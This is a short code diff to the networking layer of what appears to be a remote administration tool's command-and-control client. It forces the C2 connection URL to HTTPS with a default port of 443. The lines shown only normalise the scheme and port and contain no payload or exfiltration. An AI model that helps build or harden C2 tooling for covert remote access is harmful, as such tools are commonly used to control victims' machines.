@@ -185,19 +185,23 @@ namespace Pulsar.Client.Networking
             }
 
             var builder = new UriBuilder(url);
-            if (string.IsNullOrEmpty(builder.Scheme))
+            if (string.IsNullOrEmpty(builder.Scheme) ||
+                !builder.Scheme.Equals(Uri.UriSchemeHttps, StringComparison.OrdinalIgnoreCase))
             {
                 builder.Scheme = Uri.UriSchemeHttps;
+                builder.Port = port > 0 ? port : 443;
             }
-
-            if (builder.Port <= 0 && port > 0)
+            else
             {
-                builder.Port = port;
-            }
+                if (builder.Port <= 0 && port > 0)
+                {
+                    builder.Port = port;
+                }
 
-            if (builder.Port <= 0)
-            {
-                builder.Port = 443;
+                if (builder.Port <= 0)
+                {
+                    builder.Port = 443;
+                }
             }
 
             var stream = new HttpC2ClientStream(builder.Uri);
